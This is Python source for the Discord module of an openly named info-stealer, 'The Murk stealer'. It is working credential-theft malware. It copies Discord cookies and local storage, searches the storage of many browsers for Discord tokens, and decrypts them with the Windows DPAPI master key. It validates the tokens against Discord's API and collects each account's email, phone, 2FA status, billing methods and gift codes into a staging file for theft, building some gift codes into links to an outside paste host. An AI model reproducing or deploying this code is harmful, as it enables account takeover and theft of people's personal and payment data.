#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import sep,environ,makedirs,getenv,path,listdir,walk
from shutil import copy2,copytree
from re import findall
from base64 import b64decode
from json import loads
from requests import get
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
"""
all needed paths
"""
path3 = r"discord\Network\Cookies"
path1 = r"discord\settings.json"
path2 = r'discord\Local Storage\leveldb'

def Discord(data):
    try:
        print("discord")
        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
        makedirs(rf'{pathtofile}\windll\Messengers\Discord')
        user = environ['USERPROFILE'] + sep + r'AppData\Roaming'
        copy2(user+ sep + path3,rf'{pathtofile}\windll\Messengers\Discord')# copy data
        copy2(user+ sep + path1,rf'{pathtofile}\windll\Messengers\Discord')# copy data
        try:
            copytree(user+ sep + path2,rf'{pathtofile}\windll\Messengers\Discord\Local Storage\leveldb')# copy dir
        except:
            pass
        print("TokenGrabber")
        try:
            Discorde()
        except Exception as e :
            print(e)
        data.append("\n∟📨Discord")
        return data
    except Exception as e :
        print(e)
        return data
    


class Discorde:
    def __init__(self):
        print("discord start")
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = getenv("localappdata")
        self.roaming = getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload()


    def get_master_key(self, pathl):
        with open(pathl, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = loads(c)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, pathl in paths.items():
            if not path.exists(pathl):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in pathl:
                if path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in listdir(pathl):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{pathl}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in listdir(pathl):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{pathl}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            r = get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for pathl, _, files in walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{pathl}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            r = get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
    def upload(self):
        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = ""
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}
            user = get(self.baseurl, headers=headers).json()
            payment = get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            gift = get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            phone = user['phone']
            email = user['email']

            if user['mfa_enabled']:
                mfa = "ON"
            else:
                mfa = "OFF"

            premium_types = {
                0: "NONE",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user['premium_type'], "NONE")

            methods = "NONE"
            if payment:
                methods = ""
                for method in payment:
                    if method['type'] == 1:
                        methods += "Card"
                    elif method['type'] == 2:
                        methods += "PayPal"
                    else:
                        methods += "?"

            val += f'Discord ID: {discord_id}\nEmail: {email}\nmobile_phone: {phone}\n2FA: {mfa}\nNitro: {nitro}\nBilling: {methods}\nToken: {token}\n'

            if "code" in gift.text:
                codes = loads(gift.text)
                for code in codes:
                    val_codes.append((code['code'], code['promotion']['outbound_title']))

            if not val_codes:
                val += "\nNo Gift Cards Found\n"
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n:gift: **{t}:**\n`{c}`\n'
            else:
                for c, t in val_codes:
                    val += f'\n{t}:\n{c}\nhttps://paste-pgpj.onrender.com/?p={c}\n'
            self.tokens_sent += token
            pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
        with open(rf"{pathtofile}\windll\Messengers\Discord\tokenGrabber.txt", "a", encoding="utf8") as file:
            file.write(val)